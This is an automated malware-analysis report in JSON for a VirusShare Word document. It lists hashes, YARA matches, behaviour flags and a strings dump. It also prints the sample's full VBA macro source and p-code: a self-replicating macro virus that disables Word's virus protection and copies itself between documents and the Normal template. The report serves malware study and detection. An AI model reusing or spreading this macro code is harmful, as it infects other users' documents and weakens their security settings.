{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "AutoClose": "Runs when the Word document is closed",
            "AutoOpen": "Runs when the Word document is opened",
            "Chr": "May attempt to obfuscate specific str",
            "Environ": "May read system environment variables",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Kill": "May delete a file",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code",
            "codemodule": "May attempt to modify the VBA code"
        },
        "macro": "Sub AutoClose()\nOn Error GoTo ou: Options.VirusProtection = False: Options.SaveNormalPrompt = False: Options.ConfirmConversions = False\nSet NTVBC = NormalTemplate.VBProject.VBComponents.Item(1): Set ADVBC = ActiveDocument.VBProject.VBComponents.Item(1)\nad = ADVBC.codemodule.CountOfLines: nt = NTVBC.codemodule.CountOfLines: EXPFN = Environ(\"temp\") & \"\\~CL7610_2.~MP\"\nIf nt > 28 And ad > 28 Then GoTo ou\nIf nt < 29 Then\n    Set dhst = NTVBC\n    Set shst = ADVBC\nElse\n    Set dhst = ADVBC\n    Set shst = NTVBC\nEnd If\nshst.Name = dhst.Name\nshst.Export (EXPFN)\nWith dhst.codemodule\n.AddFromFile (EXPFN)\n.deletelines 1, 4\ntemp$ = .lines(1, 1)\n.replaceline 1, \"Sub AutoOpen()\"\n.replaceline 19, \".replaceline 1,\" & Chr$(34) & temp$ & Chr$(34)\ntemp$ = .lines(28, 1)\n.replaceline 28, \"Sub ToolsMacro()\"\n.replaceline 22, \".replaceline 28,\" & Chr$(34) & temp$ & Chr$(34)\nEnd With\nKill (EXPFN)\nou:\nEnd Sub\nSub ViewVBCode()\nEnd Sub\n\n' Processing file: VirusShare_1d85a708cba72c8cc5a47497a12f77df\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 5746 bytes\n' Line #0:\n' \tFuncDefn (Sub AutoClose())\n' Line #1:\n' \tOnError ou \n' \tBoS 0x0000 \n' \tLitVarSpecial (False)\n' \tLd Options \n' \tMemSt VirusProtection \n' \tBoS 0x0000 \n' \tLitVarSpecial (False)\n' \tLd Options \n' \tMemSt SaveNormalPrompt \n' \tBoS 0x0000 \n' \tLitVarSpecial (False)\n' \tLd Options \n' \tMemSt ConfirmConversions \n' Line #2:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tSet NTVBC \n' \tBoS 0x0000 \n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tArgsMemLd Item 0x0001 \n' \tSet ADVBC \n' Line #3:\n' \tLd ADVBC \n' \tMemLd codemodule \n' \tMemLd CountOfLines \n' \tSt ad \n' \tBoS 0x0000 \n' \tLd NTVBC \n' \tMemLd codemodule \n' \tMemLd CountOfLines \n' \tSt nt \n' \tBoS 0x0000 \n' \tLitStr 0x0004 \"temp\"\n' \tArgsLd Environ 0x0001 \n' \tLitStr 0x000E \"\\~CL7610_2.~MP\"\n' \tConcat \n' \tSt EXPFN \n' Line #4:\n' \tLd nt \n' \tLitDI2 0x001C \n' \tGt \n' \tLd ad \n' \tLitDI2 0x001C \n' \tGt \n' \tAnd \n' \tIf \n' \tBoSImplicit \n' \tGoTo ou \n' \tEndIf \n' Line #5:\n' \tLd nt \n' \tLitDI2 0x001D \n' \tLt \n' \tIfBlock \n' Line #6:\n' \tSetStmt \n' \tLd NTVBC \n' \tSet dhst \n' Line #7:\n' \tSetStmt \n' \tLd ADVBC \n' \tSet shst \n' Line #8:\n' \tElseBlock \n' Line #9:\n' \tSetStmt \n' \tLd ADVBC \n' \tSet dhst \n' Line #10:\n' \tSetStmt \n' \tLd NTVBC \n' \tSet shst \n' Line #11:\n' \tEndIfBlock \n' Line #12:\n' \tLd dhst \n' \tMemLd New \n' \tLd shst \n' \tMemSt New \n' Line #13:\n' \tLd EXPFN \n' \tParen \n' \tLd shst \n' \tArgsMemCall Export 0x0001 \n' Line #14:\n' \tStartWithExpr \n' \tLd dhst \n' \tMemLd codemodule \n' \tWith \n' Line #15:\n' \tLd EXPFN \n' \tParen \n' \tArgsMemCallWith AddFromFile 0x0001 \n' Line #16:\n' \tLitDI2 0x0001 \n' \tLitDI2 0x0004 \n' \tArgsMemCallWith deletelines 0x0002 \n' Line #17:\n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tArgsMemLdWith lines 0x0002 \n' \tSt temp$ \n' Line #18:\n' \tLitDI2 0x0001 \n' \tLitStr 0x000E \"Sub AutoOpen()\"\n' \tArgsMemCallWith replaceline 0x0002 \n' Line #19:\n' \tLitDI2 0x0013 \n' \tLitStr 0x000F \".replaceline 1,\"\n' \tLitDI2 0x0022 \n' \tArgsLd Chr$ 0x0001 \n' \tConcat \n' \tLd temp$ \n' \tConcat \n' \tLitDI2 0x0022 \n' \tArgsLd Chr$ 0x0001 \n' \tConcat \n' \tArgsMemCallWith replaceline 0x0002 \n' Line #20:\n' \tLitDI2 0x001C \n' \tLitDI2 0x0001 \n' \tArgsMemLdWith lines 0x0002 \n' \tSt temp$ \n' Line #21:\n' \tLitDI2 0x001C \n' \tLitStr 0x0010 \"Sub ToolsMacro()\"\n' \tArgsMemCallWith replaceline 0x0002 \n' Line #22:\n' \tLitDI2 0x0016 \n' \tLitStr 0x0010 \".replaceline 28,\"\n' \tLitDI2 0x0022 \n' \tArgsLd Chr$ 0x0001 \n' \tConcat \n' \tLd temp$ \n' \tConcat \n' \tLitDI2 0x0022 \n' \tArgsLd Chr$ 0x0001 \n' \tConcat \n' \tArgsMemCallWith replaceline 0x0002 \n' Line #23:\n' \tEndWith \n' Line #24:\n' \tLd EXPFN \n' \tParen \n' \tArgsCall Kill 0x0001 \n' Line #25:\n' \tLabel ou \n' Line #26:\n' \tEndSub \n' Line #27:\n' \tFuncDefn (Sub ViewVBCode())\n' Line #28:\n' \tEndSub \n"
    },
    "filename": "VirusShare_1d85a708cba72c8cc5a47497a12f77df",
    "filesize": 43520,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 5.0, Code page: 1252, Author: MACRO, Template: Normal.dot, Last Saved By: MACRO, Revision Number: 1, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Sat Feb  5 21:46:00 2000, Last Saved Time/Date: Sat Feb  5 21:46:00 2000, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "1d85a708cba72c8cc5a47497a12f77df",
        "sha1": "ebfb6295e08cefb7878abd8fe35b491e6654b03c",
        "sha256": "b51eb8327ab09943c2d05e46a1cb638f60f67dfb5a5abc873a778130c44bfcc0"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj\u064e",
            "PRq\"p",
            "/ =!",
            "bjbj\u064e",
            "n+Bn+B",
            "MACRO",
            "Normal.dot",
            "MACRO",
            "Microsoft Word 8.0",
            "Title",
            "_PID_GUID",
            "`rq\"p",
            "0q\"p",
            "`rq\"p",
            "pq\"p",
            "Sub AutoOpen()C@Z",
            "temp$",
            "\\~CL7610_2.~MP",
            "Sub ToolsMacro()C@Z",
            ".replaceline 1,",
            ".replaceline 28,",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "0{00020P906-",
            "$0046}",
            "|Creatabl",
            "False",
            "Predecla",
            "\"@Expose",
            "emplateD0eriv",
            "eCustomiz",
            "Sub Auto",
            "n Error ",
            "GoTo ou:",
            " Options",
            ".VirusProtec",
            "SaveNormDal",
            "C@onfirm",
            "ers*",
            "et NTVBCG",
            "k.VB",
            "Compon",
            "s.Item(1): ",
            ".code",
            "module.C",
            "ountOfLines: nA2&A",
            "EXPFN@.E",
            "nviron(\"",
            "&p\") & \"",
            "\\~CL7610@_2.~MPI",
            "> 28 A",
            "nd  ",
            "\t< 29 ",
            ":dhs#G",
            " (:With",
            ".AddFromFi",
            ".delete",
            "lAT 1, 4",
            "AH$L.",
            ".recB",
            "\"EOpen()OK",
            "9, \"",
            "\"@]Chr$(3f4",
            "288, N",
            "olsMacro",
            "E`-a'",
            "Kill)",
            "a sVie>wZ",
            "lR~N%3H",
            "VlR~N%3H",
            "Q\\L)",
            "Q\\<)",
            "]c,\\",
            "`15,",
            "#*#l*#\"",
            "#*F,%",
            "`15,",
            "#*#l*#\"",
            "#*F,%",
            "7389c9a2e",
            "H0z-",
            "Wordk",
            "Win16~",
            "Win32",
            "Normal",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Office",
            "Documentj",
            "AutoOpen*",
            "ToolsMacrou",
            "Options",
            "NormalTemplateq",
            "NTVBC&",
            "ActiveDocument\\",
            "ADVBC",
            "ad~\\",
            "nto^",
            "Environ",
            "EXPFN,q",
            "dhstc`",
            "shst",
            "tempR",
            "ChrK~",
            "Kill",
            "Version",
            "CLASS",
            "BEGIN",
            "MultiUse",
            "VirusProtectionoD",
            "SaveNormalPrompt\u02bc",
            "ConfirmConversions",
            "VBProjectOh",
            "VBComponents",
            "Itemz",
            "codemodule",
            "CountOfLines!\\",
            "Export",
            "AddFromFileu",
            "deletelines",
            "lines",
            "replaceline",
            "AutoClose",
            "ViewVBCode",
            "_B_var_NTVBC",
            "_B_var_ADVBC",
            "_B_var_ad&",
            "_B_var_nt",
            "_B_var_Environ/",
            "_B_var_EXPFN",
            "_B_var_dhst",
            "_B_var_shstZ",
            "_B_str_temp",
            "_B_str_Chrm#",
            "Normal",
            "stdo",
            "G{00020430-",
            "0046}#2",
            ".0#0#C:\\",
            "WINDOWS\\",
            "System32",
            "e2.tlb#",
            "OLE Automation",
            "MSFn",
            "421227E-",
            "A2B1-49C",
            "1-99B9-E",
            "4E17EB75h9FE",
            "TWD#Micr@osoft ",
            "b Object",
            " LibraryG",
            "Q9206C8",
            "D3-B515-",
            "4D21-AAB",
            "2-D007E1@250233",
            "OCUME~1\\@JOEHAR",
            "L OCALS",
            "Temp\\VBE\\E-",
            "EXg-.E",
            "~OffDic",
            "~0}12",
            "DF8D04C-",
            "5BFA-101@B-BDE5",
            "~A*A",
            "21OF",
            "FICE97\\E",
            "NGLISH\\W0ORD\\C",
            "/O9`7.DLL\\C! (8.0",
            "isDocument",
            "/*Ti",
            "TX\"B",
            "O0)@",
            "+6g\\.",
            "Normal",
            "ThisDocument",
            "C:\\PROGRAM FILES\\COMMON FILES\\MICROSOFT SHARED\\VBA\\VBA332.DLL",
            "C:\\Program Files\\Microsoft Office\\Office\\MSWORD8.OLB",
            "Word",
            "C:\\WINDOWS\\System32\\stdole2.tlb",
            "stdole",
            "~\"!\u0131I~Y",
            "C:\\WINDOWS\\system32\\MSForms.TWD",
            "MSForms",
            "C:\\DOCUME~1\\JOEHAR~1\\LOCALS~1\\Temp\\VBE\\MSForms.EXD",
            "C:\\OFFICE97\\ENGLISH\\WORD\\OFFICE\\MSO97.DLL",
            "Office",
            "VK~NQ",
            "Cv2QV",
            "Document",
            "lR~N%3H",
            "AutoClose",
            "ViewVBCode",
            "codemodule",
            "CountOfLines",
            "VBA332.DLL",
            "temp\t",
            "\\~CL7610_2.~MP",
            "Name",
            "Export",
            "AddFromFile",
            "deletelines",
            "lines\t",
            "Sub AutoOpen()",
            "replaceline",
            ".replaceline 1,",
            "Sub ToolsMacro()",
            ".replaceline 28,",
            "ThisDocument",
            "ID=\"{5018EE22-E677-4F20-9BDE-2D5FB406575C}\"",
            "Document=ThisDocume",
            "nt/&H00000000",
            "Name=\"Normal\"",
            "HelpContextID=\"0\"",
            "CMG=\"8F8D6DE073E006E406E406E406E4\"",
            "DPB=\"1E1CFC71048F9290929092\"",
            "GC=\"ADAF4F1E51AC52AC5253\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=0, 0, 0, 0, C",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8",
            "PRq\"p",
            " PAGE ",
            "Attention:",
            "ATTN:",
            " AUTHOR ",
            "\tPage ",
            " PAGE ",
            " DATE ",
            "Best regards,",
            "Best wishes,",
            "CERTIFIED MAIL",
            "CONFIDENTIAL",
            "Confidential\tPage ",
            " PAGE ",
            " DATE ",
            "Cordially,",
            "Created by ",
            " AUTHOR ",
            "Created on ",
            " CREATEDATE ",
            "Dear Mom and Dad,",
            "Dear Sir or Madam:",
            " FILENAME ",
            " FILENAME \\p ",
            "In reply to:",
            "Ladies and Gentlemen:",
            "Last printed ",
            " PRINTDATE ",
            "Last saved by ",
            " LASTSAVEDBY ",
            "Love,",
            "Page ",
            " PAGE ",
            " of ",
            " NUMPAGES ",
            "PERSONAL",
            "Reference:",
            "Regards,",
            "REGISTERED MAIL",
            "Respectfully yours,",
            "Respectfully,",
            "Sincerely yours,",
            "Sincerely,",
            "SPECIAL DELIVERY",
            "Subject:",
            "Take care,",
            "Thank you,",
            "Thanks,",
            "To Whom It May Concern:",
            "VIA AIRMAIL",
            "VIA FACSIMILE",
            "VIA OVERNIGHT MAIL",
            "Yours truly,",
            "/ =!"
        ],
        "file": {
            "C:\\OFFICE97\\ENGLISH\\WORD\\OFFICE\\MSO97.DLL": "Library",
            "C:\\PROGRAM FILES\\COMMON FILES\\MICROSOFT SHARED\\VBA\\VBA332.DLL": "Library",
            "C:\\Program Files\\Microsoft Office\\Office\\MSWORD8.OLB": "Autogen",
            "VBA332.DLL": "Library"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.302930",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "maldoc_somerules.yar": "Office_AutoOpen_Macro"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
